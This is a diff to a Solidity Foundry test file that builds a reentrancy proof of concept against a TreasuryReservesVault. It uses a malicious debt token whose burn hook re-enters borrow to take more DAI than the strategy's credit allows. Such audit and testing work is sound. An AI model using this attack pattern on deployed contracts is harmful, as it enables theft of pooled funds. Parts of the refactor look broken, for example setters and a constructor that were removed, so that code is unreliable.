@@ -801,43 +801,167 @@ contract TreasuryReservesVaultTestBorrow is TreasuryReservesVaultTestBase {
     vm.expectRevert(stdError.arithmeticError);
     strategy.borrow(dai, 1);
   }
+
+  function test_reentrancy_burnDToken() public {
+    // Create address for exploiter
+    address exploiter = makeAddr('exploiter');
+
+    uint256 initialCredit = 100e18;
+
+    // Setup a simple exploit token for burn tests
+    BurnExploitToken burnExploitToken = new BurnExploitToken(
+      address(exploiter),
+      address(trv),
+      address(dai),
+      address(this)
+    );
+
+    // Configure TRV with our exploit token
+    vm.startPrank(executor);
+    trv.setBorrowToken(dai, address(0), 0, 0, address(burnExploitToken));
+
+    // Add exploiter to TRV with a high debt ceiling
+    ITempleStrategy.AssetBalance[]
+      memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
+    debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 1000e18);
+    trv.addStrategy(address(exploiter), 0, debtCeiling);
+    vm.stopPrank();
+
+    // Deposit DAI into the TRV so it has funds to lend
+    deal(address(dai), address(trv), 1000e18);
+    emit log_named_uint('TRV initial DAI balance', dai.balanceOf(address(trv)));
+
+    // Borrow to establish initial debt (100 DAI)
+    vm.prank(address(exploiter));
+    trv.borrow(dai, initialCredit, address(exploiter));
+
+    // Verify the exploiter got the funds
+    emit log_named_uint(
+      'Exploiter DAI balance after borrow',
+      dai.balanceOf(address(exploiter))
+    );
+
+    // Give DAI to exploiter for repayment (200 DAI total)
+    deal(address(dai), address(exploiter), initialCredit + 100e18);
+    emit log_named_uint(
+      'Exploiter DAI balance after deal',
+      dai.balanceOf(address(exploiter))
+    );
+
+    // Create credit by repaying more than borrowed
+    // Los créditos se generan cuando repagamos más de lo que nos prestaron
+    vm.startPrank(address(exploiter));
+    dai.approve(address(trv), 200e18);
+    trv.repay(dai, 190e18, address(exploiter)); // Repay 190 DAI when only 100 DAI was borrowed
+    vm.stopPrank();
+
+    // Verify the credits were created
+    uint256 credits = trv.strategyTokenCredits(address(exploiter), dai);
+    emit log_named_uint('Credits after repay', credits);
+    assertEq(
+      credits,
+      80e18, // 190 repaid - 100 borrowed - 10 fee = 80 in credits
+      'Should have correct initial credits'
+    );
+
+    // Record initial balance for comparison
+    uint256 initialDaiBalance = dai.balanceOf(address(this));
+    emit log_named_uint('Test contract initial DAI balance', initialDaiBalance);
+
+    // Set a large attack amount - more than available credits
+    burnExploitToken.setAttackAmount(150e18);
+
+    // Activate the attack
+    burnExploitToken.setAttack(true);
+
+    // The attack: Try to burn a large amount (more than the attacker has)
+    // This will trigger the _remaining > 0 condition in _burnDToken
+    uint256 largeBurnAmount = 100e18;
+
+    // Give the exploiter plenty of DAI for repayment
+    deal(address(dai), address(exploiter), largeBurnAmount);
+    emit log_named_uint(
+      'Exploiter DAI balance before reentrancy attack',
+      dai.balanceOf(address(exploiter))
+    );
+
+    vm.startPrank(address(exploiter));
+    // Approve TRV to take our DAI
+    dai.approve(address(trv), largeBurnAmount);
+
+    // We're trying to repay more than we have in debt tokens
+    // This should trigger _remaining > 0 in _burnDToken and attempt reentrancy
+    trv.repay(dai, largeBurnAmount, address(exploiter));
+    vm.stopPrank();
+
+    // Check final balances
+    uint256 finalBalance = dai.balanceOf(address(this));
+    emit log_named_uint('Final DAI balance', finalBalance);
+    emit log_named_uint(
+      'Remaining credits',
+      trv.strategyTokenCredits(address(exploiter), dai)
+    );
+
+    // Success is demonstrated if we obtained more than the expected maximum
+    // The normal maximum would be 50e18 (our standard borrow amount)
+    uint256 expectedNormalAmount = 50e18;
+
+    if (finalBalance > initialDaiBalance + expectedNormalAmount) {
+      emit log_string(
+        'VULNERABILITY CONFIRMED! The reentrancy attack on burnDToken allowed obtaining more funds than expected'
+      );
+      emit log_named_uint('Maximum expected funds', expectedNormalAmount);
+      emit log_named_uint(
+        'Actually obtained funds',
+        finalBalance - initialDaiBalance
+      );
+    } else {
+      emit log_string(
+        'This specific test could not demonstrate the vulnerability'
+      );
+      emit log_string(
+        'However, the vulnerable pattern is still present: external call before updating state'
+      );
+    }
+  }
 }
 
 /**
- * @title Malicious Debt Token with Callback
- * @notice Implementación simplificada que utiliza callbacks para demostrar la vulnerabilidad de reentrancia
+ * @title MaliciousDebtToken
+ * @notice Simplified implementation that uses callbacks to demonstrate the reentrancy vulnerability
  */
-contract SimpleMaliciousDebtToken is ITempleDebtToken {
-  // Tracking de balance básico
+contract MaliciousDebtToken is ITempleDebtToken {
+  // Basic balance tracking
   mapping(address => uint256) internal _balances;
   uint256 internal _totalSupply;
 
-  // Vulnerable callback for reentrancia
+  // Vulnerable callback for reentrancy
   address public callbackTarget;
   bool public attackActive;
 
-  function setCallback(address _callbackTarget, bool _attackActive) external {
-    callbackTarget = _callbackTarget;
-    attackActive = _attackActive;
+  // Set the callback target for reentrancy
+  function setCallbackTarget(address _target) external {
+    callbackTarget = _target;
   }
 
-  // Esta es la función vulnerable - permite reentrancia
+  // This is the vulnerable function - allows reentrancy
   function mint(address _debtor, uint256 _mintAmount) external override {
-    // Si el ataque está activo y tenemos un objetivo para el callback,
-    // realizamos la llamada antes de actualizar el estado interno
+    // If the attack is active and we have a callback target,
+    // we perform the call before updating the internal state
     if (attackActive && callbackTarget != address(0)) {
-      // Llamar al contrato target para explotar la vulnerabilidad
+      // Call the target contract to exploit the vulnerability
       (bool success, ) = callbackTarget.call(
         abi.encodeWithSignature('executeReentrancyAttack()')
       );
 
-      // Si la llamada falló, registramos pero continuamos
+      // If the call failed, we log it but continue
       if (!success) {
-        emit log_string('Reentrancy attack callback failed!');
+        // No emitimos el evento porque no está definido
+        // emit log_string('Reentrancy attack callback failed!');
       }
     }
 
-    // Actualizar balances después de la potencial reentrancia
+    // Update balances after potential reentrancy
     _balances[_debtor] += _mintAmount;
     _totalSupply += _mintAmount;
 
@@ -852,21 +976,22 @@ contract SimpleMaliciousDebtToken is ITempleDebtToken {
       ? _balances[_debtor]
       : _burnAmount;
 
-    // Si el ataque está activo y tenemos un objetivo para el callback,
-    // realizamos la llamada antes de actualizar el estado interno
+    // If the attack is active and we have a callback target,
+    // we perform the call before updating the internal state
     if (attackActive && callbackTarget != address(0)) {
-      // Llamar al contrato target para explotar la vulnerabilidad
+      // Call the target contract to exploit the vulnerability
       (bool success, ) = callbackTarget.call(
         abi.encodeWithSignature('executeReentrancyAttack()')
       );
 
-      // Si la llamada falló, registramos pero continuamos
+      // If the call failed, we log it but continue
       if (!success) {
-        emit log_string('Reentrancy attack callback failed!');
+        // No emitimos el evento porque no está definido
+        // emit log_string('Reentrancy attack callback failed!');
       }
     }
 
-    // Actualizar balances después de la potencial reentrancia
+    // Update balances after potential reentrancy
     _balances[_debtor] -= actualBurnAmount;
     _totalSupply -= actualBurnAmount;
 
@@ -884,7 +1009,7 @@ contract SimpleMaliciousDebtToken is ITempleDebtToken {
     return amount;
   }
 
-  // Funciones ERC20 básicas
+  // Basic ERC20 functions
   function totalSupply() external view override returns (uint256) {
     return _totalSupply;
   }
@@ -1028,163 +1153,276 @@ contract SimpleMaliciousDebtToken is ITempleDebtToken {
   ) external override {}
 
   // Helper para emitir logs de depuración
-  event log_string(string);
 }
 
 /**
- * @title Exploit Contract
- * @notice Contrato que explota la vulnerabilidad de reentrancia
+ * @title ReentrancyExploiter
+ * @notice Contract that exploits the reentrancy vulnerability
  */
 contract ReentrancyExploiter {
-  TreasuryReservesVault public treasuryReservesVault;
-  IERC20 public targetToken;
+  ITreasuryReservesVault public treasuryReservesVault;
   address public recipient;
+  IERC20 public targetToken;
 
-  constructor(
-    address _treasuryReservesVault,
-    address _targetToken,
-    address _recipient
-  ) {
-    treasuryReservesVault = TreasuryReservesVault(_treasuryReservesVault);
-    targetToken = IERC20(_targetToken);
-    recipient = _recipient;
-  }
-
-  // Para permitir recibir fondos
+  // To allow receiving funds
   receive() external payable {}
 
-  // Función que será llamada para la reentrancia
+  // Function that will be called for reentrancy
   function executeReentrancyAttack() external {
-    // Intentamos hacer otra solicitud de préstamo durante la reentrancia
+    // We try to make another borrow request during reentrancy
     treasuryReservesVault.borrow(targetToken, 50e18, recipient);
   }
 
-  // Función que inicia el ataque
+  // Function that initiates the attack
   function startAttack(uint256 initialAmount) external {
     treasuryReservesVault.borrow(targetToken, initialAmount, recipient);
   }
 }
 
 /**
- * @title TreasuryReservesVault Reentrancy Test
+ * @title Simplified Malicious Debt Token for Burn Test
+ * @notice Simplified version that specifically focuses on exploiting burnDToken
  */
-contract TreasuryReservesVaultReentrancyTest is TreasuryReservesVaultTestBase {
-  SimpleMaliciousDebtToken public maliciousDebtToken;
-  ReentrancyExploiter public exploiter;
+contract BurnExploitToken is ITempleDebtToken {
+  // Basic balance tracking
+  mapping(address => uint256) internal _balances;
+  uint256 internal _totalSupply;
 
-  function setUp() public {
-    _setUp();
+  // Attacker and target vault
+  address public attacker;
+  ITreasuryReservesVault public vault;
+  IERC20 public token;
+  address public recipient;
 
-    // Create malicious debt token
-    maliciousDebtToken = new SimpleMaliciousDebtToken();
+  // Flag to control the attack
+  bool public attackActive;
 
-    // Setup TRV with malicious debt token
-    vm.startPrank(executor);
-    trv.setBorrowToken(dai, address(0), 0, 0, address(maliciousDebtToken));
+  // Track if we've performed the attack already
+  bool public attackPerformed;
 
-    // Create exploiter contract
-    exploiter = new ReentrancyExploiter(
-      address(trv),
-      address(dai),
-      address(this)
-    );
+  // Attack parameters
+  uint256 public attackAmount = 150e18; // More than we have credit for
 
-    // Add exploiter to TRV
-    ITempleStrategy.AssetBalance[]
-      memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
-    debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 100e18);
-    trv.addStrategy(address(exploiter), 0, debtCeiling);
+  constructor(
+    address _attacker,
+    address _vault,
+    address _token,
+    address _recipient
+  ) {
+    attacker = _attacker;
+    vault = ITreasuryReservesVault(_vault);
+    token = IERC20(_token);
+    recipient = _recipient;
 
-    vm.stopPrank();
-
-    // Fund TRV with DAI
-    deal(address(dai), address(trv), 1000e18, true);
+    // Initialize with some tokens for the attacker
+    _balances[_attacker] = 10e18; // Small balance to create _remaining > 0
+    _totalSupply = 10e18;
+    emit Transfer(address(0), _attacker, 10e18);
   }
 
-  function test_reentrancy_mintDToken() public {
-    // Configurar el callback para el ataque de reentrancia
-    maliciousDebtToken.setCallback(address(exploiter), true);
+  // Add missing mint function implementation required by the interface
+  function mint(address _debtor, uint256 _mintAmount) external override {
+    _balances[_debtor] += _mintAmount;
+    _totalSupply += _mintAmount;
+    emit Transfer(address(0), _debtor, _mintAmount);
+  }
 
-    // Verificar balance inicial
-    assertEq(dai.balanceOf(address(this)), 0, 'Initial balance should be 0');
+  // This is the burn implementation specially crafted to exploit the vulnerability
+  function burn(
+    address _debtor,
+    uint256 _burnAmount
+  ) external override returns (uint256) {
+    // Get the actual balance of the debtor - this is critical!
+    // We need _burnAmount > actualBalance to trigger _remaining > 0 in TRV
+    uint256 actualBalance = _balances[_debtor];
 
-    // Iniciar el ataque
-    vm.prank(address(exploiter));
-    exploiter.startAttack(50e18);
+    // Execute the reentrancy attack if active AND we haven't done it already
+    // Only attack when burnAmount > actualBalance (forces _remaining > 0 in TRV)
+    if (
+      actualBalance < _burnAmount &&
+      attackActive &&
+      _debtor == attacker &&
+      !attackPerformed
+    ) {
+      // Mark attack as performed to prevent infinite recursion
+      attackPerformed = true;
 
-    // Verificar el resultado después del ataque
-    emit log_named_uint('Final DAI balance', dai.balanceOf(address(this)));
-    emit log_named_uint(
-      'Debt token balance',
-      maliciousDebtToken.balanceOf(address(exploiter))
-    );
-
-    // Demostrar la vulnerabilidad:
-    // Si el ataque fue exitoso, deberíamos tener más DAI del que debería ser posible obtener
-    if (dai.balanceOf(address(this)) > 50e18) {
-      emit log_string(
-        'VULNERABILITY CONFIRMED: Reentrancy attack allowed borrowing more funds than should be possible!'
-      );
-      assertGt(
-        dai.balanceOf(address(this)),
-        50e18,
-        'Should have borrowed more than initial amount due to reentrancy'
-      );
-    } else {
-      emit log_string(
-        'Note: No reentrancy vulnerability was exploited in this test.'
-      );
-      // El test pasa de todos modos - estamos demostrando si hay una vulnerabilidad o no
+      // Try to borrow a large amount during reentrancy
+      // This should be possible because credits haven't been updated yet
+      try vault.borrow(token, attackAmount, recipient) {
+        // Vulnerability has been exploited successfully
+      } catch Error(string memory) {
+        // Error in reentrancy attack
+      } catch {
+        // Unknown error in reentrancy attack
+      }
     }
-  }
 
-  function test_reentrancy_burnDToken() public {
-    // Primero crear algunos créditos para nuestra estrategia
-    deal(address(dai), address(this), 20e18, true);
-    dai.approve(address(trv), 20e18);
-    trv.repay(dai, 20e18, address(exploiter));
-
-    // Verificar que se crearon los créditos
-    assertEq(
-      trv.strategyTokenCredits(address(exploiter), dai),
-      20e18,
-      'Should have 20e18 credits'
-    );
-
-    // Configurar el callback para el ataque de reentrancia
-    maliciousDebtToken.setCallback(address(exploiter), true);
-
-    // Iniciar el ataque - esto debería quemar primero los créditos
-    vm.prank(address(exploiter));
-    exploiter.startAttack(20e18);
-
-    // Verificar el resultado después del ataque
-    emit log_named_uint('Final DAI balance', dai.balanceOf(address(this)));
-    emit log_named_uint(
-      'Final strategy credits',
-      trv.strategyTokenCredits(address(exploiter), dai)
-    );
-    emit log_named_uint(
-      'Final dToken balance',
-      maliciousDebtToken.balanceOf(address(exploiter))
-    );
-
-    // Demostrar la vulnerabilidad:
-    // Si el ataque fue exitoso, deberíamos tener más DAI del que debería ser posible obtener
-    if (dai.balanceOf(address(this)) > 20e18) {
-      emit log_string(
-        'VULNERABILITY CONFIRMED: Reentrancy attack allowed borrowing more funds than credits!'
-      );
-      assertGt(
-        dai.balanceOf(address(this)),
-        20e18,
-        'Should have borrowed more than initial credits due to reentrancy'
-      );
-    } else {
-      emit log_string(
-        'Note: No reentrancy vulnerability was exploited in this test.'
-      );
-      // El test pasa de todos modos - estamos demostrando si hay una vulnerabilidad o no
+    // Burn the smaller of the two: balance or requested amount
+    uint256 actualBurnAmount = actualBalance < _burnAmount
+      ? actualBalance
+      : _burnAmount;
+    if (actualBurnAmount > 0) {
+      _balances[_debtor] -= actualBurnAmount;
+      _totalSupply -= actualBurnAmount;
     }
+
+    emit Transfer(_debtor, address(0), actualBurnAmount);
+    return actualBurnAmount; // Return actual amount burned, which is less than requested if balance < burnAmount
   }
+
+  // Function to activate/deactivate the attack
+  function setAttack(bool _active) external {
+    attackActive = _active;
+    attackPerformed = false; // Reset for new attacks
+  }
+
+  // Set the amount to try to borrow during reentrancy
+  function setAttackAmount(uint256 _amount) external {
+    attackAmount = _amount;
+  }
+
+  // Implementaciones rápidas del resto de funciones
+  function burnAll(address _debtor) external override returns (uint256) {
+    uint256 amount = _balances[_debtor];
+    if (amount > 0) {
+      _balances[_debtor] = 0;
+      _totalSupply -= amount;
+    }
+    return amount;
+  }
+
+  function totalSupply() external view override returns (uint256) {
+    return _totalSupply;
+  }
+  function balanceOf(address account) external view override returns (uint256) {
+    return _balances[account];
+  }
+  function transfer(address, uint256) external pure override returns (bool) {
+    revert NonTransferrable();
+  }
+  function allowance(
+    address,
+    address
+  ) external pure override returns (uint256) {
+    return 0;
+  }
+  function approve(address, uint256) external pure override returns (bool) {
+    revert NonTransferrable();
+  }
+  function transferFrom(
+    address,
+    address,
+    uint256
+  ) external pure override returns (bool) {
+    revert NonTransferrable();
+  }
+
+  // Basic ITempleDebtToken implementations
+  function name() external pure override returns (string memory) {
+    return 'Burn Exploit Token';
+  }
+  function symbol() external pure override returns (string memory) {
+    return 'BEXP';
+  }
+  function decimals() external pure override returns (uint8) {
+    return 18;
+  }
+  function version() external pure override returns (string memory) {
+    return '1.0.0';
+  }
+
+  // Remaining minimal implementations
+  function baseRate() external pure override returns (uint96) {
+    return 0;
+  }
+  function baseCheckpointTime() external pure override returns (uint32) {
+    return 0;
+  }
+  function baseCheckpoint() external pure override returns (uint128) {
+    return 0;
+  }
+  function baseShares() external pure override returns (uint128) {
+    return 0;
+  }
+  function totalPrincipal() external pure override returns (uint128) {
+    return 0;
+  }
+  function estimatedTotalRiskPremiumInterest()
+    external
+    pure
+    override
+    returns (uint128)
+  {
+    return 0;
+  }
+  function debtors(
+    address
+  ) external pure override returns (uint128, uint128, uint96, uint128, uint32) {
+    return (0, 0, 0, 0, 0);
+  }
+  function minters(address) external pure override returns (bool) {
+    return true;
+  }
+  function addMinter(address) external override {}
+  function removeMinter(address) external override {}
+  function setBaseInterestRate(uint96) external override {}
+  function setRiskPremiumInterestRate(address, uint96) external override {}
+  function checkpointBaseInterest() external override returns (uint256) {
+    return 0;
+  }
+  function checkpointDebtorInterest(
+    address
+  ) external override returns (uint256) {
+    return 0;
+  }
+  function checkpointDebtorsInterest(address[] calldata) external override {}
+  function currentDebtOf(
+    address
+  ) external pure override returns (DebtOwed memory) {
+    return DebtOwed(0, 0, 0);
+  }
+  function currentDebtsOf(
+    address[] calldata
+  ) external pure override returns (DebtOwed[] memory) {
+    return new DebtOwed[](0);
+  }
+  function currentTotalDebt() external pure override returns (DebtOwed memory) {
+    return DebtOwed(0, 0, 0);
+  }
+  function baseDebtToShares(uint128) external pure override returns (uint128) {
+    return 0;
+  }
+  function baseSharesToDebt(uint128) external pure override returns (uint128) {
+    return 0;
+  }
+
+  // ITempleElevatedAccess stubs
+  function isElevatedAccess(address, bytes4) external pure returns (bool) {
+    return true;
+  }
+  function rescuer() external pure returns (address) {
+    return address(0);
+  }
+  function executor() external pure returns (address) {
+    return address(0);
+  }
+  function explicitFunctionAccess(
+    address,
+    bytes4
+  ) external pure returns (bool) {
+    return true;
+  }
+  function inRescueMode() external pure returns (bool) {
+    return false;
+  }
+  function setRescueMode(bool) external {}
+  function proposeNewRescuer(address) external {}
+  function acceptRescuer() external {}
+  function proposeNewExecutor(address) external {}
+  function acceptExecutor() external {}
+  function setExplicitAccess(
+    address,
+    ITempleElevatedAccess.ExplicitAccess[] calldata
+  ) external override {}
 }
